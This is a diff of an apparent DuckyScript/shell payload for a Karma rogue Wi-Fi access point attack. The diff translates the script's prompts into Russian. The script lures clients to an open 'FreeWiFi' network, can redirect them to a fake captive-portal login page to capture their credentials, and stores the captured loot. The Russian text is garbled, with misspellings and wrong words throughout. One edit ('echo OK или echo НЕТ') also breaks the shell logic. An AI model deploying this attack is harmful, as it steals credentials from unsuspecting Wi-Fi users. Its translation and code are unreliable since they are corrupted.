@@ -12,56 +12,57 @@ nullsec_require_iface || exit 1
 LOOT_DIR="/mmc/nullsec"
 mkdir -p "$LOOT_DIR"/{karma,creds,logs}
 
-PROMPT "NULLSEC KARMA ATTACK
+PROMPT "НУЛЛСЕК KARMA АТАКА
 
-Rogue AP attack that responds
-to client probe requests.
+Корруптная AP-атака
+отвечающая на все
+клиентские запросы.
 
-Captures credentials via
-captive portal.
+Пересылают учётные данные
+через captive portal.
 
-Press OK to configure."
+Нажмите OK для конфигурирования."
 
 # Need both interfaces
 if [ ! -d "/sys/class/net/$IFACE" ]; then
-    ERROR_DIALOG "$IFACE не найден!
+    ERROR_DIALOG "$IFACE не найдён!
     
-Need $IFACE for AP mode."
+Требуется $IFACE для AP-режима."
     exit 1
 fi
 
 # SSID for open AP
-SSID=$(TEXT_PICKER "SSID AP name:" "FreeWiFi")
+SSID=$(TEXT_PICKER "Название SSID AP:" "FreeWiFi")
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="FreeWiFi" ;; esac
 
-# Channel
-CHANNEL=$(NUMBER_PICKER "WiFi channel (1-11):" 6)
+# Канал
+CHANNEL=$(NUMBER_PICKER "канал WiFi (1-11):" 6)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac
 [ $CHANNEL -lt 1 ] && CHANNEL=1
 [ $CHANNEL -gt 11 ] && CHANNEL=11
 
-# Duration  
-DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
+# Лониторинг  
+DURATION=$(NUMBER_PICKER "Нониторинг (сек):" 300)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac
 [ $DURATION -lt 60 ] && DURATION=60
 
 # Captive portal?
 PORTAL=""
-resp=$(CONFIRMATION_DIALOG "Enable captive portal?
+resp=$(CONFIRMATION_DIALOG "Включить captive portal?
 
-Redirects clients to fake
-login page to capture creds.")
+Перенаправляет клиентов на
+должные страницы для перерахвата учётных данных.")
 [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && PORTAL="1"
 
-resp=$(CONFIRMATION_DIALOG "Start Karma Attack?
+resp=$(CONFIRMATION_DIALOG "Начать Karma атаку?
 
 SSID: $SSID
-Channel: $CHANNEL
-Длительность: ${DURATION}s
-Portal: $([ -n "$PORTAL" ] && echo YES || echo NO)
+Kanal: $CHANNEL
+Нониторинг: ${DURATION}с
+Портал: $([ -n "$PORTAL" ] && echo OK или echo НЕТ)
 
-WARNING: This creates a
-rogue access point!")
+ОСТОРОЖНОСТЬ: Это создаэт неведомую
+точку доступа!")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 # Stop conflicting services
@@ -135,12 +136,12 @@ killall hostapd dnsmasq 2>/dev/null
 # Count connections
 CLIENTS=$(cat /tmp/dnsmasq.leases 2>/dev/null | wc -l || echo 0)
 
-PROMPT "KARMA ATTACK COMPLETE
+PROMPT "КАРМА-АТАКА ЗАВЕРШЕНА
 
 SSID: $SSID
-Clients connected: $CLIENTS
+Подключены клиенты: $CLIENTS
 
-Check logs in:
+Проверьте логи в:
 $LOOT_DIR/karma/
 
-Press OK to exit."
+Нажмите OK для выхода."
